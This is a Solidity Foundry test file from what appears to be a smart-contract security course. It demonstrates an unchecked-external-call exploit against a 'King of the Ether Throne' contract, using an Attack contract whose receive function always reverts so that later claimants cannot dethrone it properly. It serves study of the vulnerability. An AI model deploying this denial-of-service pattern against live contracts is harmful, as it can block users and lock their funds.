// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {KingOfTheEtherThrone} from "../../src/Week1/Day4_unchecked_external_calls.sol";

interface IKingOfTheEtherThrone {
    function claimThrone() external payable;
}

contract Attack {
    IKingOfTheEtherThrone public throne;

    constructor(address _throne) {
        throne = IKingOfTheEtherThrone(_throne);
    }

    function attack() external payable {
        throne.claimThrone{value: msg.value}();
    }

 
    receive() external payable {
        console.log("chu");
        revert("I refuse compensation");
    }
}


contract KingOfTheEtherThroneTest is Test{
    Attack public attack;
    KingOfTheEtherThrone public kingOfTheEtherThrone;

    function setUp() external{
        kingOfTheEtherThrone = new KingOfTheEtherThrone();
        attack = new Attack(address(kingOfTheEtherThrone));
    }

function test_exploit() external {
    address user = address(1);
    vm.deal(user, 20 ether);


    vm.deal(address(attack), 20 ether);
    attack.attack{value: 10 ether}();

    console.log("King after attack:", kingOfTheEtherThrone.king());


    vm.prank(user);
    kingOfTheEtherThrone.claimThrone{value: 20 ether}();

    console.log("King after dethrone:", kingOfTheEtherThrone.king());
}

}